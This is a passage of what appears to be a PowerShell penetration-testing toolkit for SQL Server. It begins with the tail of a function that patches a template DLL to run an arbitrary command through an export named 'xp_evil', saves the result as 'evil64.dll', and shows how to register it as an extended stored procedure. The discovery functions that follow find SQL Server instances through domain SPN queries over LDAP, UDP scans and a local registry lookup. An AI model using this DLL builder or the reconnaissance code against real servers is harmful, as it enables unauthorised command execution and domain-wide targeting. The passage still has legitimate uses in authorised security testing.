CEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!"

        # -----------------------------------------------
        # Setup command 
        # -----------------------------------------------

        # Command to injectin into the DLL (if not defined by the user)
        IF(-not($Command)){
            $CommandString = "echo This is a test. > c:\temp\test.txt && REM"
        }else{
            $CommandString = "$Command && REM"
        }

        # Calculate the length of the BufferString
        $BufferStringLen = $BufferString.Length

        # Calculate the length of the Command
        $CommandStringLen = $CommandString.Length

        # Check if the command is to long to be accepted by cmd.exe used by the system call
        if ($CommandStringLen -gt $BufferStringLen){
            Write-Warning " Command is too long!"
            Break
        }else{
            $BuffLenDiff = $BufferStringLen - $CommandStringLen
            $NewBuffer =  " " * $BuffLenDiff
            $CommandString = "$CommandString && REM $NewBuffer"
        }

        # Convert command string 
        $CommandStringBytes = ([system.Text.Encoding]::UTF8).GetBytes($CommandString)

        # Get string value of the DLL file
        $S = [System.Text.Encoding]::ASCII.GetString($DllBytes)

        # Set the offset to 0
        $Index = 0

        # Get the starting offset of the buffer string
        $Index = $S.IndexOf($BufferString)

        if(($Index -eq 0) -and ($Index -ne -1))
        {
            throw("Could not find string $BufferString !")
            Break
        }else{
            Write-Information " Found buffer offset for command: $Index" 
        }

        # Replace target bytes
        for ($i=0; $i -lt $CommandStringBytes.Length; $i++)
        {
            $DllBytes[$Index+$i]=$CommandStringBytes[$i]
        }

        # -----------------------------------------------
        # Setup proc / dll function export name
        # -----------------------------------------------
        $ProcNameBuffer = "EVILEVILEVILEVILEVIL"

        # Set default dll name
        IF(-not($ExportName)){
            $ExportName = "xp_evil"
        }        

        # Check function name length
        $ProcNameBufferLen = $ProcNameBuffer.Length
        $ExportNameLen = $ExportName.Length
        If ($ProcNameBufferLen -lt $ExportNameLen){
            Write-Warning " The function name is too long!"
            Break
        }else{
            $ProcBuffLenDiff = $ProcNameBufferLen - $ExportNameLen
            $ProcNewBuffer =  '' * $ProcBuffLenDiff
            #$ExportName = "$ExportName$ProcNewBuffer" # need to write nullbytes
        }

        # Get function name string offset
        $ProcIndex = 0
        
        # Get string value of the DLL file
        $S2 = [System.Text.Encoding]::ASCII.GetString($DllBytes)

        $ProcIndex = $S2.IndexOf($ProcNameBuffer)
        
        # Check for offset errors
        if(($ProcIndex -eq 0) -and ($ProcIndex -ne -1))
        {
            throw("Could not find string $ProcNameBuffer!")
            Break
        }else{
            Write-Information " Found buffer offset for function name: $ProcIndex" 
        }

        # Convert function name to bytes
        $ExportNameBytes = ([system.Text.Encoding]::UTF8).GetBytes($ExportName)

        # Replace target bytes
        for ($i=0; $i -lt $ExportNameBytes.Length; $i++)
        {
            $DllBytes[$ProcIndex+$i]=$ExportNameBytes[$i]
        }

        # Get offset for nulls
        $NullOffset = $ProcIndex+$ExportNameLen
        Write-Information " Found buffer offset for buffer: $NullOffset"        
        $NullBytes = ([system.Text.Encoding]::UTF8).GetBytes($ProcNewBuffer) 
        
        # Replace target bytes         
        for ($i=0; $i -lt  $ProcBuffLenDiff; $i++)
        {
            $DllBytes[$NullOffset+$i]=$NullBytes[$i]
        }

        # ------------------------------------
        # Write DLL file to disk
        # ------------------------------------

        IF(-not($OutFile)){
            $OutFile = ".\evil64.dll"
        }

        Write-Verbose "Creating DLL $OutFile"
        Write-Verbose " - Exported function name: $ExportName"
        Write-Verbose " - Exported function command: `"$Command`""        
        Write-Verbose " - Manual test: rundll32 $OutFile,$ExportName"
        Set-Content -Value $DllBytes -Encoding Byte -Path $OutFile
        Write-Verbose " - DLL written"

        Write-Verbose " "
        Write-Verbose "SQL Server Notes"
        Write-Verbose "The exported function can be registered as a SQL Server extended stored procedure. Options below:"
        Write-Verbose " - Register xp via local disk: sp_addextendedproc `'$ExportName`', 'c:\temp\myxp.dll'"	    
        Write-Verbose " - Register xp via UNC path: sp_addextendedproc `'$ExportName`', `'\\servername\pathtofile\myxp.dll`'"
        Write-Verbose " - Unregister xp: sp_dropextendedproc `'$ExportName`'"
}
#endregion

#########################################################################
#
#region          DISCOVERY FUNCTIONS
#
#########################################################################

# -------------------------------------------
# Function: Get-DomainSpn
# -------------------------------------------
# Author: Scott Sutherland
# Reference: http://social.technet.microsoft.com/wiki/contents/articles/5392.active-directory-ldap-syntax-filters.aspx
function Get-DomainSpn
{
<#
    .SYNOPSIS
        Used to query domain controllers via LDAP. Supports alternative credentials from non-domain system
        Note: This will use the default logon server by default.
    .PARAMETER Username
        Domain account to authenticate to Active Directory.   
    .PARAMETER Password
        Domain password to authenticate to Active Directory. 
    .PARAMETER Credential
        Domain credential to authenticate to Active Directory. 
    .PARAMETER DomainController
        Domain controller to authenticated to. Requires username/password or credential.
    .PARAMETER ComputerName
        Computer name to filter for. 
    .PARAMETER DomainAccount
        Domain account to filter for. 
    .PARAMETER SpnService
        SPN service code to filter for. 
    .EXAMPLE
        PS C:\temp> Get-DomainSpn -SpnService MSSQL | Select-Object -First 2

        UserSid      : 15000005210002431346712321821222048886811922073100
        User         : SQLServer1$
        UserCn       : SQLServer1
        Service      : MSSQLSvc
        ComputerName : SQLServer1.domain.local
        Spn          : MSSQLSvc/SQLServer1.domain.local:1433
        LastLogon    : 6/24/2016 6:56 AM
        Description  : This is a SQL Server test instance using a local managed service account.

        UserSid      : 15000005210002431346712321821222048886811922073101
        User         : SQLServiceAccount
        UserCn       : SQLServiceAccount
        Service      : MSSQLSvc
        ComputerName : SQLServer2.domain.local
        Spn          : MSSQLSvc/SQLServer2.domain.local:NamedInstance
        LastLogon    : 3/26/2016 3:43 PM
        Description  : This is a SQL Server test instance using a domain service account.
    .EXAMPLE
        PS C:\temp> Get-DomainSpn -DomainController 10.0.0.1  -Username Domain\User -Password Password123!       
#>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="Domain user to authenticate with domain\user.")]
        [string]$Username,

        [Parameter(Mandatory=$false,
        HelpMessage="Domain password to authenticate with domain\user.")]
        [string]$Password,

        [Parameter(Mandatory=$false,
        HelpMessage="Credentials to use when connecting to a Domain Controller.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        HelpMessage="Domain controller for Domain and Site that you want to query against.")]
        [string]$DomainController,

        [Parameter(Mandatory=$false,        
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="Computer name to filter for.")]
        [string]$ComputerName,

        [Parameter(Mandatory=$false,
        ValueFromPipeline=$true,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="Domain account to filter for.")]
        [string]$DomainAccount,

        [Parameter(Mandatory=$false,        
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SPN service code.")]
        [string]$SpnService,

        [Parameter(Mandatory=$false,
        HelpMessage="Suppress verbose errors.  Used when function is wrapped.")]
        [switch]$SuppressVerbose
    )

    Begin
    {
        if(-not $SuppressVerbose){
            Write-Verbose "Getting domain SPNs..."
        }

        # Setup table to store results
        $TableDomainSpn = New-Object System.Data.DataTable
        $TableDomainSpn.Columns.Add('UserSid') | Out-Null
        $TableDomainSpn.Columns.Add('User') | Out-Null
        $TableDomainSpn.Columns.Add('UserCn') | Out-Null
        $TableDomainSpn.Columns.Add('Service') | Out-Null
        $TableDomainSpn.Columns.Add('ComputerName') | Out-Null
        $TableDomainSpn.Columns.Add('Spn') | Out-Null
        $TableDomainSpn.Columns.Add('LastLogon') | Out-Null
        $TableDomainSpn.Columns.Add('Description') | Out-Null
        $TableDomainSpn.Clear()
    }

    Process
    {

        try
        {
            # Setup LDAP filter
            $SpnFilter = ""

            if($DomainAccount){
                $SpnFilter = "(objectcategory=person)(SamAccountName=$DomainAccount)"
            }

            if($ComputerName){
                $ComputerSearch = "$ComputerName`$"
                $SpnFilter = "(objectcategory=computer)(SamAccountName=$ComputerSearch)"
            }

            # Get results
            $SpnResults = Get-DomainObject -LdapFilter "(&(servicePrincipalName=$SpnService*)$SpnFilter)" -DomainController $DomainController -Username $Username -Password $Password -Credential $Credential

            # Parse results
            $SpnResults | ForEach-Object {

                [string]$SidBytes = [byte[]]"$($_.Properties.objectsid)".split(" ");
                [string]$SidString = $SidBytes -replace ' ',''
                $Spn = $_.properties.serviceprincipalname.split(",")
                           
                foreach ($item in $Spn)
                {
                    # Parse SPNs
                    $SpnServer =  $item.split("/")[1].split(":")[0].split(' ')[0]
                    $SpnService =  $item.split("/")[0]

                    # Parse last logon
                    if ($_.properties.lastlogon){
                        $LastLogon = [datetime]::FromFileTime([string]$_.properties.lastlogon).ToString('g')
                    }else{
                        $LastLogon = ""
                    }

                    # Add results to table
                    $TableDomainSpn.Rows.Add(
                    [string]$SidString,
                    [string]$_.properties.samaccountname,
                    [string]$_.properties.cn,
                    [string]$SpnService,
                    [string]$SpnServer, 
                    [string]$item,
                    $LastLogon,
                    [string]$_.properties.description
                 ) | Out-Null
                }
             }
        }catch{
          "Error was $_"
          $line = $_.InvocationInfo.ScriptLineNumber
          "Error was in Line $line"
        }
    }

    End
    {
        # Check for results
        if ($TableDomainSpn.Rows.Count -gt 0)
        {
            $TableDomainSpnCount = $TableDomainSpn.Rows.Count
            if(-not $SuppressVerbose){
                Write-Verbose "$TableDomainSpnCount SPNs found on servers that matched search criteria."
            }
            Return $TableDomainSpn 
        }else{
            Write-Verbose "0 SPNs found."
        }
    }
}


# -------------------------------------------
# Function: Get-DomainObject
# -------------------------------------------
# Author: Will Schroeder
# Modifications: Scott Sutherland
function Get-DomainObject
{
<#
    .SYNOPSIS
        Used to query domain controllers via LDAP. Supports alternative credentials from non-domain system
        Note: This will use the default logon server by default.
    .PARAMETER Username
        Domain account to authenticate to Active Directory.   
    .PARAMETER Password
        Domain password to authenticate to Active Directory. 
    .PARAMETER Credential
        Domain credential to authenticate to Active Directory. 
    .PARAMETER DomainController
        Domain controller to authenticated to. Requires username/password or credential.
    .PARAMETER LdapFilter
        LDAP filter. 
    .PARAMETER LdapPath
        Ldap path. 
    .PARAMETER $Limit 
        Maximum number of Objects to pull from AD, limit is 1,000.". 
    .PARAMETER SearchScope 
        Scope of a search as either a base, one-level, or subtree search, default is subtree.. 
    .EXAMPLE
        PS C:\temp> Get-DomainObject -LdapFilter "(&(servicePrincipalName=*))" 
    .EXAMPLE
        PS C:\temp> Get-DomainObject -LdapFilter "(&(servicePrincipalName=*))" -DomainController 10.0.0.1  -Username Domain\User  -Password Password123!       
    .Note
        This was based on Will Schroeder's Get-ADObject function from https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerView/powerview.ps1
#>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="Domain user to authenticate with domain\user.")]
        [string]$Username,

        [Parameter(Mandatory=$false,
        HelpMessage="Domain password to authenticate with domain\user.")]
        [string]$Password,

        [Parameter(Mandatory=$false,
        HelpMessage="Credentials to use when connecting to a Domain Controller.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        HelpMessage="Domain controller for Domain and Site that you want to query against.")]
        [string]$DomainController,

        [Parameter(Mandatory=$false,
        HelpMessage="LDAP Filter.")]
        [string]$LdapFilter = "",

        [Parameter(Mandatory=$false,
        HelpMessage="LDAP path.")]
        [string]$LdapPath,

        [Parameter(Mandatory=$false,
        HelpMessage="Maximum number of Objects to pull from AD, limit is 1,000 .")]
        [int]$Limit = 1000,

        [Parameter(Mandatory=$false,
        HelpMessage="scope of a search as either a base, one-level, or subtree search, default is subtree.")]
        [ValidateSet("Subtree","OneLevel","Base")]
        [string]$SearchScope = "Subtree"
    )
    Begin
    {
        # Create PS Credential object
        if($username -and $password){
            $secpass = ConvertTo-SecureString $Password -AsPlainText -Force
            $Credential = New-Object System.Management.Automation.PSCredential ($Username, $secpass)                
        }        

        # Create Create the connection to LDAP       
        if ($DomainController)
        {
            $objDomain = (New-Object System.DirectoryServices.DirectoryEntry "LDAP://$DomainController", $Credential.UserName,$Credential.GetNetworkCredential().Password).distinguishedname
            
            # add ldap path
            if($LdapPath)
            {
                $LdapPath = "/"+$LdapPath+","+$objDomain
                $objDomainPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$DomainController$LdapPath", $Credential.UserName,$Credential.GetNetworkCredential().Password
            }else{
                $objDomainPath= New-Object System.DirectoryServices.DirectoryEntry "LDAP://$DomainController", $Credential.UserName,$Credential.GetNetworkCredential().Password
            }
            
            $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomainPath
        }else{
            $objDomain = ([ADSI]"").distinguishedName
            
            # add ldap path
            if($LdapPath)
            {
                $LdapPath = $LdapPath+","+$objDomain
                $objDomainPath  = [ADSI]"LDAP://$LdapPath"
            }else{
                $objDomainPath  = [ADSI]""
            }
              
            $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomainPath
        }

        # Setup LDAP filter
        $ObjSearcher.PageSize = $Limit
        $ObjSearcher.Filter = $LdapFilter
        $ObjSearcher.SearchScope = "Subtree"
    }

    Process
    {        
        try
        {
            # Return object
            $ObjSearcher.FindAll() | ForEach-Object {
              
                $_
            }
        }
        catch
        {
          "Error was $_"
          $line = $_.InvocationInfo.ScriptLineNumber
          "Error was in Line $line"
        }                
    }

    End
    {
    }
}

# -------------------------------------------
# Function:  Get-SQLInstanceDomain
# -------------------------------------------
# Author: Scott Sutherland
Function  Get-SQLInstanceDomain {
<#
    .SYNOPSIS
        Returns a list of SQL Server instances discovered by querying a domain controller for systems with registered MSSQL service principal names.  
        The function will default to the current user's domain and logon server, but an alternative domain controller can be provided.
        UDP scanning of management servers is optional.
    .PARAMETER Username
        Domain user to authenticate with domain\user.
    .PARAMETER Password
        Domain password to authenticate with domain\user.
    .PARAMETER Credential
        Credentials to use when connecting to a Domain Controller.
    .PARAMETER DomainController
        Domain controller for Domain and Site that you want to query against.  Only used when username/password or credential is provided.
    .PARAMETER ComputerName
        Domain computer name to filter for.
    .PARAMETER DomainAccount
        Domain account to filter for.
    .PARAMETER CheckMgmt
        Performs UDP scan of servers with registered MSServerClusterMgmtAPI SPNs to help find additional SQL Server instances.
    .PARAMETER UDPTimeOut
        Timeout in seconds for UDP scans of management servers. Longer timeout = more accurate.
    .EXAMPLE
        PS C:\> Get-SQLInstanceDomain -Verbose
        VERBOSE: Grabbing SQL Server SPNs from domain...
        VERBOSE: Getting domain SPNs...
        VERBOSE: Parsing SQL Server instances from SPNs...
        VERBOSE: 35 instances were found.

        ComputerName     : SQLServer1.domain.com
        Instance         : SQLServer1.domain.com
        DomainAccountSid : 1500000521000123456712921821222049996811922123456
        DomainAccount    : SQLServer1$
        DomainAccountCn  : SQLServer1
        Service          : MSSQLSvc
        Spn              : MSSQLSvc/SQLServer1.domain.com
        LastLogon        : 6/22/2016 9:00 AM
        [TRUNCATED]
    .EXAMPLE
        PS C:\> Get-SQLInstanceDomain -Verbose -CheckMgmt 
        PS C:\> Get-SQLInstanceDomain -Verbose
        VERBOSE: Grabbing SQL Server SPNs from domain...
        VERBOSE: Getting domain SPNs...
        VERBOSE: Parsing SQL Server instances from SPNs...
        VERBOSE: 35 instances were found.
        VERBOSE: Getting domain SPNs...
        VERBOSE: 10 SPNs found on servers that matched search criteria.
        VERBOSE: Performing a UDP scan of management servers to obtain managed SQL Server instances...
        VERBOSE:  - MServer1.domain.com - UDP Scan Start.
        VERBOSE:  - MServer1.domain.com - UDP Scan Complete.

        ComputerName     : SQLServer1.domain.com
        Instance         : SQLServer1.domain.com
        DomainAccountSid : 1500000521000123456712921821222049996811922123456
        DomainAccount    : SQLServer1$
        DomainAccountCn  : SQLServer1
        Service          : MSSQLSvc
        Spn              : MSSQLSvc/SQLServer1.domain.com
        LastLogon        : 6/22/2016 9:00 AM
        [TRUNCATED]        
    .EXAMPLE
        PS C:\> Get-SQLInstanceDomain -DomainController 10.10.10.1 -Username domain\user -Password SecretPassword123!
        VERBOSE: Grabbing SQL Server SPNs from domain...
        VERBOSE: Getting domain SPNs...
        VERBOSE: Parsing SQL Server instances from SPNs...
        VERBOSE: 35 instances were found.

        ComputerName     : SQLServer1.domain.com
        Instance         : SQLServer1.domain.com
        DomainAccountSid : 1500000521000123456712921821222049996811922123456
        DomainAccount    : SQLServer1$
        DomainAccountCn  : SQLServer1
        Service          : MSSQLSvc
        Spn              : MSSQLSvc/SQLServer1.domain.com
        LastLogon        : 6/22/2016 9:00 AM
        [TRUNCATED]

                
#>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="Domain user to authenticate with domain\user.")]
        [string]$Username,

        [Parameter(Mandatory=$false,
        HelpMessage="Domain password to authenticate with domain\user.")]
        [string]$Password,

        [Parameter(Mandatory=$false,
        HelpMessage="Credentials to use when connecting to a Domain Controller.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        HelpMessage="Domain controller for Domain and Site that you want to query against.")]
        [string]$DomainController,

        [Parameter(Mandatory=$false,
        ValueFromPipeline=$true,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="Computer name to filter for.")]
        [string]$ComputerName,

        [Parameter(Mandatory=$false,
        ValueFromPipeline=$true,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="Domain account to filter for.")]
        [string]$DomainAccount,

        [Parameter(Mandatory=$false,        
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="Performs UDP scan of servers managing SQL Server clusters.")]
        [switch]$CheckMgmt,

        [Parameter(Mandatory=$false,        
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="Timeout in seconds for UDP scans of management servers. Longer timeout = more accurate.")]
        [int]$UDPTimeOut = 3
    )

    Begin
    {
        # Table for SPN output
        $TblSQLServerSpns = New-Object System.Data.DataTable
        $TblSQLServerSpns.Columns.Add("ComputerName") | Out-Null
        $TblSQLServerSpns.Columns.Add("Instance") | Out-Null        
        $TblSQLServerSpns.Columns.Add("DomainAccountSid") | Out-Null
        $TblSQLServerSpns.Columns.Add("DomainAccount") | Out-Null
        $TblSQLServerSpns.Columns.Add("DomainAccountCn") | Out-Null
        $TblSQLServerSpns.Columns.Add("Service") | Out-Null        
        $TblSQLServerSpns.Columns.Add("Spn") | Out-Null        
        $TblSQLServerSpns.Columns.Add("LastLogon") | Out-Null
        $TblSQLServerSpns.Columns.Add("Description") | Out-Null

        # Table for UDP scan results of management servers
    }

    Process
    {
        # Get list of SPNs for SQL Servers
        Write-Verbose "Grabbing SPNs from the domain for SQL Servers (MSSQL*)..."
        $TblSQLServers = Get-DomainSpn -DomainController $DomainController -Username $Username -Password $Password -Credential $Credential -ComputerName $ComputerName -DomainAccount $DomainAccount -SpnService 'MSSQL*' -SuppressVerbose | Where-Object {$_.service -like 'MSSQL*'}                

        Write-Verbose "Parsing SQL Server instances from SPNs..."

        # Add column containing sql server instance
        $TblSQLServers | 
        ForEach-Object {

            # Parse SQL Server instance
            $Spn = $_.Spn          
            $Instance = $Spn.split("/")[1].split(":")[1]

            # Check if the instance is a number and use the relevent delim
            $Value = 0                       
            if([int32]::TryParse($Instance,[ref]$Value)){
                $SpnServerInstance = $Spn -replace ':', ',' 
            }else{
                $SpnServerInstance = $Spn -replace ':', '\'                             
            } 

            $SpnServerInstance = $SpnServerInstance -replace 'MSSQLSvc/',''                             
              
            # Add SQL Server spn to table
            $TblSQLServerSpns.Rows.Add(
                [string]$_.ComputerName,
                [string]$SpnServerInstance,                
                $_.UserSid,
                [string]$_.User,
                [string]$_.Usercn,
                [string]$_.Service,
                [string]$_.Spn,                
                $_.LastLogon,
                [string]$_.Description) | Out-Null            
        }

        # Enumerate SQL Server instances from management servers
        if($CheckMgmt){

            Write-Verbose "Grabbing SPNs from the domain for Servers managing SQL Server clusters (MSServerClusterMgmtAPI)..."        
            $TblMgmtServers = Get-DomainSpn -DomainController $DomainController -Username $Username -Password $Password -Credential $Credential  -ComputerName $ComputerName -DomainAccount $DomainAccount -SpnService 'MSServerClusterMgmtAPI' -SuppressVerbose | Where-Object {$_.ComputerName -like "*.*"} | Select-Object ComputerName -Unique | Sort-Object ComputerName 

            Write-Verbose "Performing a UDP scan of management servers to obtain managed SQL Server instances..."
            $TblMgmtSQLServers = $TblMgmtServers | Select-Object ComputerName -Unique | Get-SQLInstanceScanUDP -UDPTimeOut $UDPTimeOut
        }
    }

    End
    {                  
        # Return data        
        if($CheckMgmt){
            Write-Verbose "Parsing SQL Server instances from the UDP scan..."
            $Tbl1 = $TblMgmtSQLServers | Select-Object ComputerName, Instance | Sort-Object ComputerName, Instance
            $Tbl2 = $TblSQLServerSpns | Select-Object ComputerName, Instance | Sort-Object ComputerName, Instance
            $Tbl3 = $Tbl1 + $Tbl2

            $InstanceCount = $Tbl3.rows.count
            Write-Verbose "$InstanceCount instances were found."
            $Tbl3
        }else{                    
            $InstanceCount = $TblSQLServerSpns.rows.count
            Write-Verbose "$InstanceCount instances were found."
            $TblSQLServerSpns
        }        
    }
}


# -------------------------------------------
# Function:  Get-SQLInstanceLocal
# -------------------------------------------
# Author: Scott Sutherland
Function  Get-SQLInstanceLocal {
<#
    .SYNOPSIS
        Returns a list of the SQL Server instances found in the Windows registry for the local system.
    .EXAMPLE
        PS C:\> Get-SQLInstanceLocal
        
        ComputerName       : Computer1
        Instance           : Computer1\SQLEXPRESS
        ServiceDisplayName : SQL Server (SQLEXPRESS)
        ServiceName        : MSSQL$SQLEXPRESS
        ServicePath        : "C:\Program Files\Microsoft SQL Server\MSSQL12.SQLEXPRESS\MSSQL\Binn\sqlservr.exe" -sSQLEXPRESS
        ServiceAccount     : NT Service\MSSQL$SQLEXPRESS
        State              : Running

        ComputerName       : Computer1
        Instance           : Computer1\STANDARDDEV2014
        ServiceDisplayName : SQL Server (STANDARDDEV2014)
        ServiceName        : MSSQL$STANDARDDEV2014
        ServicePath        : "C:\Program Files\Microsoft SQL Server\MSSQL12.STANDARDDEV2014\MSSQL\Binn\sqlservr.exe" -sSTANDARDDEV2014
        ServiceAccount     : LocalSystem
        State              : Running

        ComputerName       : Computer1
        Instance           : Computer1
        ServiceDisplayName : SQL Server (MSSQLSERVER)
        ServiceName        : MSSQLSERVER
        ServicePath        : "C:\Program Files\Microsoft SQL Server\MSSQL12.MSSQLSERVER\MSSQL\Binn\sqlservr.exe" -sMSSQLSERVER
        ServiceAccount     : NT Service\MSSQLSERVER
        State              : Running
           
#>
    Begin
    {
        # Table for output
        $TblLocalInstances = New-Object System.Data.DataTable
        $TblLocalInstances.Columns.Add("ComputerName") | Out-Null
        $TblLocalInstances.Columns.Add("Instance") | Out-Null
        $TblLocalInstances.Columns.Add("ServiceDisplayName") | Out-Null
        $TblLocalInstances.Columns.Add("ServiceName") | Out-Null
        $TblLocalInstances.Columns.Add("ServicePath") | Out-Null
        $TblLocalInstances.Columns.Add("ServiceAccount") | Out-Null
        $TblLocalInstances.Columns.Add("State") | Out-Null
    }

    Process
    {       
       # Grab SQL Server services for the server
       $SqlServices = Get-SQLServiceLocal | Where-Object { $_.ServicePath -like '*sqlservr.exe*'}
              
       # Add recrds to SQL Server instance table        
       $SqlServices |
       ForEach-Object{

                # Parse Instance
                $ComputerName = [string]$_.ComputerName                              
                $DisplayName = [string]$_.ServiceDisplayName                     

                if($DisplayName){
